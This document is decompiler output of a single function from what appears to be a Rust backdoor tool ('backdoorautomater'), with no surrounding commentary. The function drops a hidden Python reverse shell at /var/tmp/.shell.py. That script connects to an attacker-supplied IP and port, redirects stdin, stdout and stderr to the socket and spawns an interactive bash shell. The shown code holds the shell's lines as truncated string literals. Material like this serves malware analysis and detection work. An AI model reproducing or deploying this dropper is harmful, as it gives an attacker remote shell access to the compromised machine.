
  fn backdoorautomater::modifyservice::write_shell_pyfile::hce4cf953ddafe0d0(arg1: *mut i64, arg2: *mut i64) -> *mut *mut [i8; 0x94]

{
    let mut var_88: i32;
    std::fs::File::create::hf69a1aea5d21dd7b(&var_88, "/var/tmp/.shell.pyimport socket,…");
    let mut result: *mut *mut [i8; 0x94];
    
    if var_88 == 0
    {
        let fd_1: i32;
        let mut fd: i32 = fd_1;
        let result_2: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "import socket,subprocess,os;\ns=…", 0x1d);
        result = result_2;
        
        if result_2 != 0
        {
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            let result_3: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "s=socket.socket(socket.AF_INET,s…", 0x34);
            result = result_3;
            
            if result_3 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            }
            else
            {
                var_88 = "v_ip='os.dup2(s.fileno(),0);\nos…";
                let var_80: i64 = 6;
                let var_78_1: i128 = *arg2.byte_offset(8);
                let mut var_30: i128;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
                let mut var_68: i128 = var_30;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_68, 
                    "';\n));\n$i='kindNoneSomeZeroIpv…", 3);
                let var_20: u64;
                let result_4: *mut *mut [i8; 0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_68[8], var_20);
                result = result_4;
                
                if result_4 != 0
                {
                    goto 'label_4556e5;
                }
                
                var_88 = "s.connect((v_i";
                let var_80_1: i64 = 0x10;
                let var_78_2: i128 = *arg1.byte_offset(8);
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
                let mut var_48: i128 = var_30;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_48, 
                    "));\n$i='kindNoneSomeZeroIpv4Ipv…", 4);
                let result_5: *mut *mut [i8; 0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_48[8], var_20);
                result = result_5;
                
                if result_5 != 0
                {
                    'label_4556db:
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_48);
                    'label_4556e5:
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_68);
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                }
                else
                {
                    let result_6: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "os.dup2(s.fileno(),0);\nos.dup2(…", 0x17);
                    result = result_6;
                    
                    if result_6 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    let result_7: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "os.dup2(s.fileno(),1);\nos.dup2(…", 0x17);
                    result = result_7;
                    
                    if result_7 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    let result_8: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "os.dup2(s.fileno(),2);\nv_shell_…", 0x17);
                    result = result_8;
                    
                    if result_8 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    let result_9: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "v_shell_path='/usr/bin/bash';\nv…", 0x1e);
                    result = result_9;
                    
                    if result_9 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    let result_10: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "v_shell_value='-i';\np=subproces…", 0x14);
                    result = result_10;
                    
                    if result_10 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    let result_11: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                        "p=subprocess.call([v_shell_path,…", 0x31);
                    result = result_11;
                    
                    if result_11 != 0
                    {
                        goto 'label_4556db;
                    }
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_48);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_68);
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                    result = nullptr;
                }
            }
        }
    }
    else
    {
        let result_1: *mut *mut [i8; 0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
